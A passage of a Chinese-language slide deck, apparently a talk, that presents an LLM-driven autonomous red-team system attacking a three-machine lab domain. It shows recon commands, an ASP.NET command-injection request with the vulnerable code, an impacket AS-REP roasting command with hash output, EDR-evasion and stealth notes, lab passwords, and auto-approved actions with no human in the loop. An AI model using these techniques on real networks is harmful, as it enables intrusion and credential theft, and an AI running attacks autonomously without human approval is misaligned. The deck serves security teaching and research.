<span style="font-family: 'JetBrains Mono', monospace; color: var(--accent-purple); font-size: 0.7rem; font-weight: 700;">POST-EX</span> &nbsp;&nbsp;傾印 / 橫向 / 中繼
</div>
<strong>▌</strong> 每個工具獨立進程，失敗不影響其他工具。<br/>
<strong>▌</strong> LLM 從 metadata 自學，新工具上線即可使用。
</div>
</div>

<div style="background: var(--bg-elev); border-top: 3px solid var(--accent-blue); padding: 1rem 1.1rem; border-radius: 4px;">
<div style="display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 0.5rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.12em; color: var(--fg-dim);">COMMUNICATIONS</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 1rem; font-weight: 700; color: var(--accent-blue);">03</div>
</div>
<div style="font-size: 1.05rem; font-weight: 700; color: var(--fg); margin-bottom: 0.7rem;">Facts DB + WebSocket</div>
<div style="font-size: 0.78rem; line-height: 1.55; color: var(--fg-dim);">
<strong>▌ 內部通訊</strong><br/>
工具執行結果寫回 <code>PostgreSQL Facts DB</code>；<br/>
下一輪 OODA 直接讀。<br/><br/>
<strong>▌ 對外通訊</strong><br/>
<code>War Room WebSocket</code> 即時廣播 OPS LOG，<br/>
操作員可監看、可一鍵 <code>kill switch</code>。<br/><br/>
<strong>▌</strong> 兩條通道，閉環。
</div>
</div>

</div>

<div class="bridge-bottom">
<strong>Act</strong> 不只是「下指令」，是把指揮官的決策、武器庫的能力、戰場的回報接成一個閉環。
<div style="font-size: 0.78rem; color: var(--fg-dim); margin-top: 0.4rem; font-style: italic;">四個動作講完 — 最後一張：為什麼 tempo 才是勝負手 →</div>
</div>

---
transition: fade
---

<!-- Slide 28 from Harry's PPT — Ch4 Framework · TEMPO IS THE WEAPON (30× punchline) -->

<div class="deco-squares tl"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>
<div class="deco-squares br"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>

<div style="height: 100%; display: flex; flex-direction: column; justify-content: center; padding: 0 4rem; gap: 2rem;">

<div class="slide-eyebrow" style="position: absolute; top: 1.7rem; left: 3rem;">DOCTRINE / TEMPO · Page 18</div>

<div style="font-family: 'JetBrains Mono', monospace; font-size: clamp(10rem, 22vw, 18rem); font-weight: 700; color: var(--accent-green, #3FB950); line-height: 1; letter-spacing: -0.04em; text-shadow: 0 0 60px rgba(63,185,80,0.35);">
30×
</div>

<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.6rem; font-weight: 700; color: var(--fg); letter-spacing: 0.02em; line-height: 1.1;">
TEMPO IS THE WEAPON
</div>

<div style="color: var(--fg-dim); font-size: 1.15rem; line-height: 1.6; letter-spacing: 0.005em;">
30 秒一個 OODA loop · 失敗變便宜 · 速度本身就是維度
</div>

<div style="margin-top: 0.6rem; color: var(--accent-green, #3FB950); font-size: 1.05rem; font-style: italic;">
信條 ③ — 這就是這場簡報剩下的一切都在繞著轉的東西
</div>

</div>

---
transition: fade
---

<!-- Slide 29 from Harry's PPT — Ch5 Operation · CHAPTER COVER · 真槍實彈 -->
<!-- NOTE: hostname 統一寫 ACCT-DB01（Harry 原 XML cover 寫 ACCT-DB 是 typo，後續 demo 各 slide 都用 ACCT-DB01） -->

<div class="deco-squares tl"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>
<div class="deco-squares br"><div class="sq"></div><div class="sq"></div><div class="sq"></div></div>

<div style="height: 100%; display: flex; flex-direction: column; justify-content: center; padding: 0 4rem;">

<div class="slide-eyebrow" style="margin-bottom: 2rem;">// CHAPTER 05 :: OPERATION</div>

<div style="display: grid; grid-template-columns: 1fr 2fr; gap: 4rem; align-items: center;">

<div style="font-family: 'JetBrains Mono', monospace; font-size: 12rem; font-weight: 700; line-height: 1; color: var(--accent-green); text-shadow: 0 0 32px rgba(63, 185, 80, 0.45);">
05
</div>

<div>

<div style="font-size: 2.4rem; font-weight: 700; line-height: 1.3; color: var(--fg); margin-bottom: 1.6rem;">
理論講完了 — 真槍實彈
</div>

<div style="font-size: 1.05rem; line-height: 1.7; color: var(--fg-dim);">
三個 stage、不到 20 分鐘、零人工介入：<br/>
<strong style="color: var(--fg);">WEB01 → DC-01 → ACCT-DB01</strong>。
</div>

<div style="margin-top: 1.4rem; font-size: 1rem; font-weight: 600; color: var(--accent-green); border-left: 3px solid var(--accent-green); padding-left: 1rem;">
剛剛三條信條，每一頁印證一次。
</div>

</div>

</div>

</div>

---
transition: fade
zoom: 0.88
---

<!-- Slide 30 from Harry's PPT — Ch5 Operation · ARCHITECTURE · Athena 系統架構 -->

<div class="slide-eyebrow">ARCHITECTURE / OVERVIEW</div>
<div class="slide-h1">Athena 系統架構</div>
<div class="slide-sub">每一層都可獨立替換 — Anthropic / OpenAI / 在地 LLM 都跑得起來。</div>

<div style="display: flex; flex-direction: column; gap: 0.6rem; margin-top: 1.4rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--accent-green); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 0.95rem;">▌ WAR ROOM (UI)</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">Next.js 即時面板 / WebSocket 廣播 / 操作指揮</div>
</div>

<div style="text-align: center; color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">↓</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-amber); font-size: 0.95rem;">▌ OODA ENGINE</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">Observe → Orient → Decide → Act （30s loop）</div>
</div>

<div style="text-align: center; color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">↓</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-blue); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-blue); font-size: 0.95rem;">▌ DECISION + FACTS DB</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">信心值矩陣 / 風險門檻 / PostgreSQL Facts</div>
</div>

<div style="text-align: center; color: var(--accent-amber); font-family: 'JetBrains Mono', monospace;">↓</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-radius: 6px; padding: 0.8rem 1.1rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-red); font-size: 0.95rem;">▌ MCP TOOL LAYER</div>
<div style="color: var(--fg); font-size: 0.88rem; margin-top: 0.3rem;">17 個 server · 動態路由 · 各司其職</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 31 from Harry's PPT — Ch5 Operation · MISSION · 今天的目標 -->

<div class="slide-eyebrow">MISSION / TARGETS</div>
<div class="slide-h1">今天的目標</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">

<div class="kc-node benign">
<div class="label">Attacker</div>
<div class="sub">192.168.0.10<br/>Athena C2</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node recon">
<div class="label">WEB01</div>
<div class="sub">192.168.0.20<br/>IIS + ASP.NET</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit">
<div class="label">DC-01</div>
<div class="sub">192.168.0.16<br/>AD DS + ADCS</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker">
<div class="label">ACCT-DB01</div>
<div class="sub">192.168.0.23<br/>MSSQL 財務</div>
</div>

</div>

<div class="alert-box">
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-weight: 700; font-size: 0.85rem; margin-bottom: 0.4rem;">▌ MISSION BRIEF</div>
<div style="font-size: 1rem; color: var(--fg); margin-bottom: 0.4rem;">三台靶機・全強密碼・純靠 AD 設定錯誤・全自動 OODA 模式・預期 &lt; 20 分鐘</div>
<div style="font-size: 0.88rem; color: var(--accent-amber);">接下來看 AI 怎麼打穿這三台。</div>
</div>

<div style="margin-top: 1rem; font-size: 0.85rem; font-style: italic; color: var(--accent-green);">
目標確認 — 接下來 24 張，看 Athena 怎麼一步步打過去 →
</div>

---
transition: fade
---

<!-- Slide 32 from Harry's PPT — Ch5 Operation · EDGE-CASES · 踩過的坑（hidden in original PPTX） -->

<div class="slide-eyebrow">ARCHITECTURE / EDGE-CASES</div>
<div class="slide-h1">踩過的坑 — 不是每次都這麼順</div>
<div class="slide-sub">200+ 次 demo，這三個是出現頻率最高的 failure mode。</div>

<div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">01</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">EDR 擋下 LSASS dump</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">LLM 推 <code>T1003.001 confidence=0.92</code>，Defender 直接 kill process。composite 經 history 校正降到 0.34，下一輪改走 <code>T1003.003 (SAM hive)</code>。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">教訓：LLM 信心 ≠ 環境可行性，必須過 history filter</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">02</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">Bloodhound 超時 partial facts</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">大型 AD（5000+ 物件）collector 跑超過 OODA interval。改採 streaming write — 每收到一批就寫 facts，下輪 Orient 用部分情報先推進。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">trade-off: 情報不完整 vs 不卡 loop</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">03</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">平行 kill chain race condition</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">兩條鏈同時寫 <code>access.local_admin</code> → 後者覆蓋前者。改用 PostgreSQL advisory lock 鎖 fact key，後寫者 append 不覆蓋。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;"><code>SELECT pg_advisory_xact_lock(hash('access.local_admin'))</code></div>
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 33 from Harry's PPT — Ch5 Operation · INTEL · 靶機 AD 設定錯誤全景 -->

<div class="slide-eyebrow">INTEL / RECON</div>
<div class="slide-h1">靶機 AD 設定錯誤全景</div>

<table class="matrix" style="margin-top: 1rem;">
<thead>
<tr>
<th style="width: 32%">設定錯誤</th>
<th style="width: 24%">受影響</th>
<th style="width: 14%">MITRE</th>
<th style="width: 30%">與密碼強度的關係</th>
</tr>
</thead>
<tbody>
<tr>
<td>ASP.NET 命令注入</td>
<td>WEB01 debug.aspx</td>
<td><code style="color: var(--accent-amber);">T1190</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td><code>DoesNotRequirePreAuth=True</code></td>
<td>legacy_kev</td>
<td><code style="color: var(--accent-amber);">T1558.004</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td>ADCS ESC1 (VulnTemplate1)</td>
<td>Domain Users</td>
<td><code style="color: var(--accent-amber);">T1649</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td>無約束委派</td>
<td>WEB01$ 電腦帳號</td>
<td><code style="color: var(--accent-amber);">T1187</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
<tr>
<td><code>xp_cmdshell</code> 啟用</td>
<td>ACCT-DB01 MSSQL</td>
<td><code style="color: var(--accent-amber);">T1059.001</code></td>
<td style="color: var(--accent-red);"><strong>無關</strong></td>
</tr>
</tbody>
</table>

<div style="margin-top: 1.6rem; font-size: 1.6rem; font-weight: 700; color: var(--accent-amber);">
五條，沒有一條跟密碼有關。
</div>

---
transition: fade
---

<!-- Slide 34 from Harry's PPT — Ch5 Operation · INTEL · 密碼強度全部強密碼 -->

<div class="slide-eyebrow">INTEL / CREDS</div>
<div class="slide-h1">密碼強度：全部強密碼</div>

<table class="matrix" style="margin-top: 1rem;">
<thead>
<tr>
<th style="width: 22%">帳號</th>
<th style="width: 38%">密碼</th>
<th style="width: 40%">備註</th>
</tr>
</thead>
<tbody>
<tr>
<td><code style="color: var(--accent-blue);">legacy_kev</code></td>
<td><code style="color: var(--accent-amber);">M0nk3y!B@n4n4#99</code></td>
<td>強密碼，仍被破解</td>
</tr>
<tr>
<td><code style="color: var(--accent-blue);">da_alice</code></td>
<td><code style="color: var(--accent-amber);">W!nt3rC0m!ng#DA2026$</code></td>
<td>DA 帳號，從未被猜出</td>
</tr>
<tr>
<td><code style="color: var(--accent-blue);">administrator</code></td>
<td><code style="color: var(--accent-amber);">X9k#mP2!vL@qR7$</code></td>
<td>完全無法暴力破解</td>
</tr>
</tbody>
</table>

<div class="danger-box" style="text-align: center;">
<span style="font-size: 1.4rem; font-weight: 700; color: var(--accent-red);">密碼噴灑全部失敗。AI 選擇了另一條路。</span>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 35 from Harry's PPT — Ch5 Operation · STAGE 0 · 行動啟動（kickoff · OODA loop start） -->

<div class="op-header">
<span>// OPERATION ATHENA-KICKOFF</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 0 / KICKOFF</div>
<div class="slide-h1">行動啟動 <span class="status active">ACTIVE</span></div>
<div class="slide-sub">AUTO_FULL · interval=30s · noise budget=100</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node benign"><div class="label">C2</div><div class="sub">Athena</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">WEB01</div><div class="sub">queued</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">DC-01</div><div class="sub">queued</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">ACCT-DB01</div><div class="sub">queued</div></div>
</div>

<div class="alert-box">
OODA loop 啟動 — 全自動模式、人類不介入。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · ATHENA · 20:54:06</div>

```bash {1|2|3|4|5|6|all}
[20:54:06] ● MODE      AUTO_FULL
[20:54:06] ● INTERVAL  30s / loop
[20:54:06] ● RISK      medium
[20:54:06] ● NOISE     100
[20:54:06] ● STATE     → OBSERVE
[20:54:06] ● 行動啟動 · OODA loop 開始
```

</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 36 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 OBSERVE recon -->

<div class="op-header">
<span>// OPERATION ATHENA-RECON</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 0 / WEB01 · OBSERVE</div>
<div class="slide-h1">WEB01 — 偵察 <span class="status scanning">SCANNING</span></div>
<div class="slide-sub">**WEB01** <span class="status scanning">SCANNING</span> · 192.168.0.20</div>

<div class="cmd-list" style="margin-top: 1.2rem;">
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">nmap -Pn -p- 192.168.0.20</span>
<span class="tag">recon</span>
</div>
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">port 80 / 5985 / 445 OPEN</span>
<span class="tag">found</span>
</div>
<div class="cmd-row critical">
<span class="num">●</span>
<span class="cmd">curl http://192.168.0.20/ → debug.aspx 路徑可達</span>
<span class="tag">vuln</span>
</div>
</div>

<div class="alert-box">
寫入 PostgreSQL Facts DB · 等待 LLM Orient
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · WEB01</div>

```bash {1|2|3|4|5|6|7|all}
[20:54:08] ● OODA      > OBSERVE
[20:54:09] ● TOOL      nmap-scanner
[20:54:21] ● PORT 80   IIS 8.5
[20:54:21] ● PORT 5985 WinRM
[20:54:21] ● PORT 445  SMB
[20:54:32] ● /debug.aspx FOUND
[20:54:33] ● NEXT      → ORIENT
```

</div>
</div>

---
transition: fade
---

<!-- Slide 37 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 ORIENT (LLM decision T1190) -->

<div class="op-header">
<span>// OPERATION ATHENA-ORIENT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 0 / WEB01 · ORIENT</div>
<div class="slide-h1">WEB01 — 判斷</div>
<div class="slide-sub">LLM 自己決定要用 <code>web_rce_execute</code>，不是我們寫死的。</div>

<div class="compare-2" style="margin-top: 1.4rem;">

<div class="side" style="border-left: 3px solid var(--accent-amber);">
<div class="head" style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.9rem;">▌ SITUATION ASSESSMENT</div>
<div class="body" style="color: var(--fg); font-size: 0.95rem; line-height: 1.6;">
WEB01 開放 port 80<br/>
<code>IIS + ASP.NET</code><br/>
偵測到 <code>debug.aspx</code> 路徑<br/><br/>
推測為遺留診斷頁面，<br/>
未經 production hardening。
</div>
</div>

<div class="center"></div>

<div class="side green-border">
<div class="head" style="color: var(--accent-green); font-family: 'JetBrains Mono', monospace; font-size: 0.9rem;">▌ RECOMMENDED TECHNIQUE</div>
<div class="body" style="font-size: 0.85rem;">
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2.2rem; font-weight: 700; color: var(--fg); margin: 0.2rem 0;">T1190</div>
<div style="color: var(--fg-dim); margin-bottom: 0.6rem;">Exploit Public-Facing Application</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg-dim);">confidence</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 2rem; font-weight: 700; color: var(--accent-green);">0.75</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--fg-dim); margin-top: 0.4rem;">mcp_tool</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-amber); font-size: 0.85rem;">web-scanner:web_rce_execute</div>
<div style="font-family: 'JetBrains Mono', monospace; color: var(--accent-green); font-size: 0.85rem; margin-top: 0.3rem;">auto_approved = True</div>
</div>
</div>

</div>

---
transition: fade
---

<!-- Slide 38 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 ACT (debug.aspx RCE) -->

<div class="op-header">
<span>// OPERATION ATHENA-EXPLOIT</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 0 / WEB01 · ACT</div>
<div class="slide-h1">WEB01 — 行動：<code>debug.aspx</code></div>
<div class="slide-sub">零過濾，<code>cmdArg</code> 直接拼入 <code>cmd.exe /c</code>。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-red); border-left: 3px solid var(--accent-red); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem; font-family: 'JetBrains Mono', monospace;">
<div style="color: var(--accent-red); font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  HTTP REQUEST</div>

```bash
GET http://192.168.0.20/debug.aspx?cmd=whoami
→ iis apppool\defaultapppool
```

</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-left: 3px solid var(--accent-amber); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 0.8rem;">
<div style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  debug.aspx (vulnerable code)</div>

```csharp
var psi = new ProcessStartInfo("cmd.exe", "/c " + cmdArg);
psi.RedirectStandardOutput = true;
Response.Write(Server.HtmlEncode(p.StandardOutput.ReadToEnd()));
// cmdArg 完全沒過濾，使用者可塞任何 OS 指令
```

</div>

<div class="danger-box">
<strong>零過濾</strong>，<code>cmdArg</code> 直接拼入 <code>cmd.exe /c</code>。LLM 看到原始碼推測 RCE 信心 0.75 → 直接 fire。
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 39 from Harry's PPT — Ch5 Operation · STAGE 0 · WEB01 DONE (compromised) -->

<div class="op-header">
<span>// OPERATION ATHENA-FOOTHOLD</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 0 / WEB01 · DONE</div>
<div class="slide-h1">WEB01 — 攻陷 <span class="status compromised">COMPROMISED</span></div>
<div class="slide-sub">**WEB01** <span class="status compromised">COMPROMISED</span> · iis apppool\defaultapppool</div>

<div class="kill-chain compact" style="margin: 1.4rem 0;">
<div class="kc-node benign"><div class="label">C2</div><div class="sub">Athena</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node exploit"><div class="label">WEB01</div><div class="sub">RCE</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">DC-01</div><div class="sub">next</div></div>
<div class="kc-arrow">→</div>
<div class="kc-node recon"><div class="label">ACCT-DB01</div><div class="sub">queued</div></div>
</div>

<div class="alert-box">
寫入 facts: <code>access.web_shell · vector=T1190</code> — 第一台攻陷，預備 lateral 到 DC-01。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · 21:01:33</div>

```bash {1|2|3|4|5|6|7|all}
[20:54:35] ● TARGET    WEB01 / 192.168.0.20
[20:54:42] ● VECTOR    T1190 ASP.NET RCE
[20:55:03] ● PAYLOAD   → /debug.aspx?cmd=
[20:58:14] ● SHELL     iis apppool\
[21:01:33] ● ★ COMPROMISED · Δ +7m27s
[21:01:34] ● NEXT      → DC-01
[21:01:35] ● fact saved access.web_shell
```

</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 40 from Harry's PPT — Ch5 Operation · STAGE 1 · DC-01 OBSERVE (AS-REP ready) -->

<div class="op-header">
<span>// OPERATION ATHENA-LATERAL</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="op-layout">
<div class="op-content">

<div class="slide-eyebrow">STAGE 1 / DC-01 · OBSERVE</div>
<div class="slide-h1">DC-01 — 偵察 <span class="status scanning">SCANNING</span></div>
<div class="slide-sub">**DC-01** <span class="status scanning">SCANNING</span> · 192.168.0.16 · AD DS + ADCS</div>

<div class="cmd-list" style="margin-top: 1.2rem;">
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">nmap -Pn -p 88,389,445 192.168.0.16</span>
<span class="tag">recon</span>
</div>
<div class="cmd-row">
<span class="num">●</span>
<span class="cmd">bloodhound-collector -d corp.athena.lab</span>
<span class="tag">enum</span>
</div>
<div class="cmd-row critical">
<span class="num">●</span>
<span class="cmd">★ legacy_kev: DoesNotRequirePreAuth = True</span>
<span class="tag">as-rep</span>
</div>
</div>

<div class="alert-box">
DoesNotRequirePreAuth=True 已被偵測 — AS-REP roasting 路徑可行。
</div>

</div>

<div class="ops-log">
<div class="ops-header">// OPS LOG · DC-01</div>

```bash {1|2|3|4|5|6|7|all}
[21:01:40] ● OODA      > OBSERVE
[21:01:42] ● TOOL      bloodhound-collector
[21:01:55] ● PORT 88   KDC
[21:01:55] ● PORT 389  LDAP
[21:01:55] ● PORT 445  SMB
[21:02:18] ● ad.user_no_preauth: legacy_kev
[21:02:19] ● ★ AS-REP READY
```

</div>
</div>

---
transition: fade
---

<!-- Slide 41 from Harry's PPT — Ch5 Operation · STAGE 1 · AS-REP Roasting 原理 -->

<div class="slide-eyebrow">STAGE 1 / DC-01 · PRINCIPLE</div>
<div class="slide-h1">AS-REP Roasting 原理</div>
<div class="slide-sub">MITRE ATT&CK · T1558.004 · AS-REP Roasting</div>

<div class="kill-chain compact" style="margin: 1.6rem 0; gap: 0.8rem;">

<div class="kc-node recon" style="min-width: 9rem;">
<div class="label">1. 攻擊者</div>
<div class="sub">要求 legacy_kev 的 AS-REP<br/>（零憑證請求）</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node attacker" style="min-width: 9rem;">
<div class="label">2. KDC</div>
<div class="sub">DoesNotRequirePreAuth=True<br/>→ 直接回傳 AS-REP</div>
</div>

<div class="kc-arrow">→</div>

<div class="kc-node exploit" style="min-width: 9rem;">
<div class="label">3. 攻擊者</div>
<div class="sub">取得 AS-REP enc-part<br/>→ 可離線破解 NT hash</div>
</div>

</div>

<div class="danger-box">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-red); font-size: 0.9rem; margin-bottom: 0.4rem;">▌ 為何零憑證可行</div>
<div style="font-size: 1rem; line-height: 1.5;">
正常情況下 KDC 要求先驗證你是誰（pre-authentication）。<br/>
<code>DoesNotRequirePreAuth=True</code> 把這個驗證關掉了 — KDC 對任何人都吐 AS-REP。
</div>
</div>

---
transition: fade
zoom: 0.93
---

<!-- Slide 42 from Harry's PPT — Ch5 Operation · STAGE 1 · AS-REP Hash 取得 (impacket-GetNPUsers · image6 secretsdump) -->

<div class="op-header">
<span>// OPERATION ATHENA-DUMP</span>
<span class="classified">:: CLASSIFIED</span>
</div>

<div class="slide-eyebrow">STAGE 1 / DC-01 · ACT</div>
<div class="slide-h1">AS-REP Hash 取得 <span class="status dumped">DUMPED</span></div>
<div class="slide-sub">零憑證，只需要知道帳號名稱。</div>

<div style="background: var(--bg-elev); border: 1px solid var(--accent-amber); border-left: 3px solid var(--accent-amber); border-radius: 4px; padding: 0.7rem 1rem; margin-top: 1rem;">
<div style="color: var(--accent-amber); font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; letter-spacing: 0.18em; margin-bottom: 0.4rem;">● ● ●  command</div>

```bash
$ impacket-GetNPUsers corp.athena.lab/ \
      -no-pass -usersfile users.txt

[*] Getting AS_REP for legacy_kev
$krb5asrep$23$legacy_kev@CORP.ATHENA.LAB:
3a7f8c2d4e1b5a9f6c3d8e2b7a1f4c9d...  (558 chars)
```

</div>

![secretsdump](/image6.png)

<div class="alert-box">
寫入 facts: <code>access.kerberos.as_rep.legacy_kev</code> · etype=23 (rc4-hmac) · hashcat -m 18200 直接吃。
</div>

---
transition: fade
---

<!-- Slide 43 from Harry's PPT — Ch5 Operation · STAGE 1 · AS-REP Roasting OPSEC -->

<div class="slide-eyebrow">STAGE 1 / AS-REP-PROOF</div>
<div class="slide-h1">AS-REP Roasting</div>
<div class="slide-sub">協定的縫隙就是入口 — 一份 AS-REP，一條通往 DA 的路</div>

<div style="display: flex; flex-direction: column; gap: 0.7rem; margin-top: 1.2rem;">

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">01</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">KRB_AS_REQ — 沒有 PA-ENC-TIMESTAMP</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">正常 client 會在 padata 帶加密時間戳證明身分。<code>legacy_kev</code> 的 request 完全沒帶 — KDC 仍接受。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">padata: (empty) ← <code>DoesNotRequirePreAuth=True</code> 的視覺證據</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">02</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">KRB_AS_REP — enc-part 直接吐出</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">KDC 回的 enc-part 用 user 的 NT hash 加密。拿到這段就能離線爆破。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">etype: rc4-hmac (23) ← <code>hashcat -m 18200</code> 直接吃</div>
</div>
</div>

<div style="background: var(--bg-elev); border: 1px solid var(--border); border-radius: 6px; padding: 0.8rem 1rem; display: grid; grid-template-columns: 3rem 1fr; gap: 1rem; align-items: start;">
<div style="font-family: 'JetBrains Mono', monospace; font-weight: 700; color: var(--accent-green); font-size: 1.6rem;">03</div>
<div>
<div style="font-weight: 700; color: var(--fg); font-size: 1rem;">OPSEC — 為什麼這招難被抓</div>
<div style="font-size: 0.85rem; color: var(--fg-dim); margin-top: 0.3rem; line-height: 1.5;">零憑證、單次請求、合法 Kerberos 流量。爆破在離線、不打 KDC，不留登入失敗紀錄。</div>
<div style="font-family: 'JetBrains Mono', monospace; font-size: 0.78rem; color: var(--fg-faint); margin-top: 0.3rem;">noise_cost: 2  ·  網路上看起來就是一次正常的 AS-REQ</div>
</div>
</div>

</div>

---
transition: fade
---

